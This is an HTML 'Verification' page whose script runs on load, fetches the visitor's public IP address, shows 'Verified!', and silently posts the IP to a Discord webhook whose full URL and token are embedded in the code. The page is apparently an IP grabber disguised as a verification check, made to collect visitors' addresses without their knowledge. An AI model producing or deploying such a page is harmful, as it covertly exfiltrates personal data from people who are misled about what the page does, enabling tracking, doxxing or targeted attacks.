<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0; /* Grey background */
            color: #333;
        }
        .container {
            text-align: center;
            background: #fff;
            padding: 20px 40px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .container h1 {
            margin-bottom: 20px;
            font-size: 2rem;
            color: #444;
        }
        .container p {
            font-size: 1.5rem;
            margin: 0;
            color: #4CAF50; /* Green color for "Verified!" */
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Verification Status</h1>
        <p id="status">Loading...</p>
    </div>
    <script>
        const webhookURL = "https://discord.com/api/webhooks/1335407461825511475/R1E1nWc77P7aEKHeuZtVrAbmqZ4vwZDac-Y47ozpWBRS0D8OtrFCKsMpyW42FPH3gu7w"; // Replace with your webhook URL
        async function fetchIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;
                // Update the status to "Verified!"
                document.getElementById('status').textContent = "Verified!";
                // Send IP to webhook
                sendToWebhook(ip);
            } catch (error) {
                document.getElementById('status').textContent = 'Verification failed.';
                console.error('Error fetching IP:', error);
            }
        }
        async function sendToWebhook(ip) {
            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `New verified IP: ${ip}`
                    })
                });
                console.log('IP sent to webhook successfully.');
            } catch (error) {
                console.error('Error sending IP to webhook:', error);
            }
        }
        fetchIP();
    </script>
</body>
</html>
